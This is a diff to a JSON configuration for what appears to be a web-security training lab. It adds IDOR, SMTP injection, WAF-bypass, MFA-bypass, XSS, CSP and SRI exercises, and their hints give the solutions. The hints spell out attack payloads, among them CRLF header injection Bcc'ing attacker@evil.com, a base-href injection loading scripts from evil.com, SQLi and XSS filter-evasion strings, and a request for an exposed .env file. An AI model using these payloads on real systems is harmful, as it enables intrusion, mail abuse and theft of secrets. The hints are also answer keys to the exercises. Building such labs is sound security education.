@@ -24,7 +24,8 @@
         "xss-4",
         "xss-5",
         "xss-6",
-        "xss-7"
+        "xss-7",
+        "xss-8"
       ]
     },
     {
@@ -295,7 +296,8 @@
       "color": "#fef2c0",
       "labs": [
         "info-1",
-        "info-2"
+        "info-2",
+        "info-3"
       ]
     },
     {
@@ -340,7 +342,8 @@
       "color": "#f9a825",
       "labs": [
         "csp-1",
-        "csp-2"
+        "csp-2",
+        "csp-3"
       ]
     },
     {
@@ -357,7 +360,8 @@
       "name": "Subresource Integrity",
       "color": "#00695c",
       "labs": [
-        "sri-1"
+        "sri-1",
+        "sri-2"
       ]
     },
     {
@@ -446,6 +450,42 @@
         "misconfig-1",
         "misconfig-2",
         "misconfig-3"
+      ]
+    },
+    {
+      "id": "idor",
+      "name": "Insecure Direct Object Reference",
+      "color": "#a371f7",
+      "labs": [
+        "idor-1",
+        "idor-2"
+      ]
+    },
+    {
+      "id": "smtp",
+      "name": "SMTP Header Injection",
+      "color": "#d29922",
+      "labs": [
+        "smtp-1",
+        "smtp-2"
+      ]
+    },
+    {
+      "id": "waf",
+      "name": "WAF Bypass",
+      "color": "#f778ba",
+      "labs": [
+        "waf-1",
+        "waf-2"
+      ]
+    },
+    {
+      "id": "mfa",
+      "name": "Multi-Factor Authentication Bypass",
+      "color": "#e5534b",
+      "labs": [
+        "mfa-1",
+        "mfa-2"
       ]
     }
   ],
@@ -2177,6 +2217,162 @@
         "The server trusts the <code>from</code> field supplied by the client.",
         "No ownership or authorization check is applied to the action.",
         "Send <code>from</code> as another user, e.g. <code>{\"to\":\"victim\",\"amount\":100,\"from\":\"carlos\"}</code>."
+      ]
+    },
+    "idor-1": {
+      "title": "Access another customer's invoice",
+      "topic": "idor",
+      "difficulty": 1,
+      "type": "server",
+      "objective": "The invoice endpoint trusts the id parameter you supply. Access the admin's invoice.",
+      "hint": "Try <code>?id=1004</code>.",
+      "hints": [
+        "The endpoint trusts any <code>id</code> you provide.",
+        "Your own invoice is <code>1002</code> — probe neighbouring ids.",
+        "Request <code>/lab/idor-1/invoice?id=1004</code> to view the admin invoice."
+      ]
+    },
+    "idor-2": {
+      "title": "View another user's profile",
+      "topic": "idor",
+      "difficulty": 1,
+      "type": "server",
+      "objective": "The profile endpoint trusts the user_id parameter. Fetch the administrator's profile.",
+      "hint": "Try <code>?user_id=0</code>.",
+      "hints": [
+        "The endpoint returns a profile for any <code>user_id</code>.",
+        "Your profile is <code>user_id=1</code>.",
+        "Request <code>/lab/idor-2/profile?user_id=0</code> to fetch the admin profile."
+      ]
+    },
+    "smtp-1": {
+      "title": "SMTP header injection (Bcc)",
+      "topic": "smtp",
+      "difficulty": 2,
+      "type": "server",
+      "objective": "Your email address is copied into the message To: header unsanitized. Inject a CRLF to Bcc yourself.",
+      "hint": "Send an email containing <code>%0d%0aBcc: attacker@evil.com</code>.",
+      "hints": [
+        "The <code>email</code> field lands directly in the <code>To:</code> header.",
+        "A CRLF (<code>%0d%0a</code>) starts a new header line.",
+        "Inject <code>%0d%0aBcc: attacker@evil.com</code> to silently copy the message."
+      ]
+    },
+    "smtp-2": {
+      "title": "SMTP header injection (Subject)",
+      "topic": "smtp",
+      "difficulty": 2,
+      "type": "server",
+      "objective": "Your name is placed into the email Subject: header raw. Inject a CRLF to forge additional headers.",
+      "hint": "Enter a name containing <code>%0d%0aBcc: victim@example.com</code>.",
+      "hints": [
+        "The <code>name</code> field is placed into the <code>Subject:</code> header.",
+        "A CRLF (<code>%0d%0a</code>) terminates the subject and begins a new header.",
+        "Inject <code>%0d%0aBcc: victim@example.com</code> to add hidden recipients."
+      ]
+    },
+    "waf-1": {
+      "title": "WAF bypass — SQLi union",
+      "topic": "waf",
+      "difficulty": 2,
+      "type": "server",
+      "objective": "A naive WAF blocks <code>union select</code>. Bypass the filter with an alternate encoding.",
+      "hint": "Try <code>union/**/select</code> or <code>union\tselect</code>.",
+      "hints": [
+        "The WAF matches a literal <code>union select</code> pattern.",
+        "Comments or tabs break the whitespace match.",
+        "Use <code>union/**/select</code> or <code>union\tselect</code> to pass the filter."
+      ]
+    },
+    "waf-2": {
+      "title": "WAF bypass — XSS filter",
+      "topic": "waf",
+      "difficulty": 2,
+      "type": "server",
+      "objective": "A naive WAF blocks the literal <code>&lt;script</code> tag. Bypass it with an alternate vector.",
+      "hint": "Try <code>&lt;svg onload=</code>, <code>&lt;img onerror=</code> or <code>javascript:</code>.",
+      "hints": [
+        "The WAF only blocks the literal <code>&lt;script</code>.",
+        "Many other tags execute script, like <code>&lt;svg onload=</code> or <code>&lt;img onerror=</code>.",
+        "Use an alternate vector such as <code>&lt;img src=x onerror=alert(1)&gt;</code>."
+      ]
+    },
+    "mfa-1": {
+      "title": "MFA bypass — skipped step",
+      "topic": "mfa",
+      "difficulty": 2,
+      "type": "server",
+      "objective": "The server never enforces the 2FA step. Reach the dashboard without entering a valid code.",
+      "hint": "Request <code>/lab/mfa-1/dashboard</code> directly.",
+      "hints": [
+        "The 2FA prompt is purely client-side.",
+        "The dashboard endpoint has no server-side OTP check.",
+        "Request <code>/lab/mfa-1/dashboard</code> to access it directly."
+      ]
+    },
+    "mfa-2": {
+      "title": "MFA bypass — predictable OTP",
+      "topic": "mfa",
+      "difficulty": 2,
+      "type": "server",
+      "objective": "The one-time code is generated with a predictable algorithm. Login using a guessed OTP.",
+      "hint": "Try code <code>123456</code>.",
+      "hints": [
+        "The OTP algorithm is deterministic.",
+        "Guessing the code reveals the predictable generator.",
+        "Enter <code>123456</code> as the verification code."
+      ]
+    },
+    "xss-8": {
+      "title": "Stored XSS — comments",
+      "topic": "xss",
+      "difficulty": 2,
+      "type": "server",
+      "objective": "Comments are stored and rendered with no escaping. Post a payload that executes in every viewer's browser.",
+      "hint": "Post a comment containing <code>&lt;script&gt;</code> or an <code>&lt;img onerror=</code> payload.",
+      "hints": [
+        "Comments persist server-side.",
+        "They are rendered into the page with no sanitization.",
+        "Post a comment containing <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(1)&gt;</code>."
+      ]
+    },
+    "sri-2": {
+      "title": "SRI — JSONP callback hijack",
+      "topic": "sri",
+      "difficulty": 2,
+      "type": "server",
+      "objective": "The page loads a third-party script via a JSONP endpoint with no integrity hash. Hijack the callback.",
+      "hint": "Override <code>?callback=</code> with an executable payload.",
+      "hints": [
+        "The callback value is reflected into the script tag.",
+        "No <code>integrity</code> attribute protects the external script.",
+        "Use <code>?callback=alert(1)</code> to turn it into executable JavaScript."
+      ]
+    },
+    "csp-3": {
+      "title": "CSP bypass — missing base-uri",
+      "topic": "csp",
+      "difficulty": 3,
+      "type": "server",
+      "objective": "The CSP has no base-uri directive. Inject a <code>&lt;base href&gt;</code> to hijack relative resource loads.",
+      "hint": "Reflect <code>&lt;base href=&quot;https://evil.com/&quot;&gt;</code>.",
+      "hints": [
+        "A <code>&lt;base&gt;</code> tag rewrites every relative URL on the page.",
+        "Without <code>base-uri</code>, CSP cannot block it.",
+        "Inject <code>&lt;base href=&quot;https://evil.com/&quot;&gt;</code> so relative scripts load from your host."
+      ]
+    },
+    "info-3": {
+      "title": "Sensitive files — exposed .env",
+      "topic": "info",
+      "difficulty": 1,
+      "type": "server",
+      "objective": "A leftover dotfile is publicly accessible. Read the exposed environment variables.",
+      "hint": "Request <code>/lab/info-3/.env</code>.",
+      "hints": [
+        "Deployment artifacts like dotfiles are sometimes left public.",
+        "The app serves static paths under its lab directory.",
+        "Request <code>/lab/info-3/.env</code> to read the secrets."
       ]
     }
   }
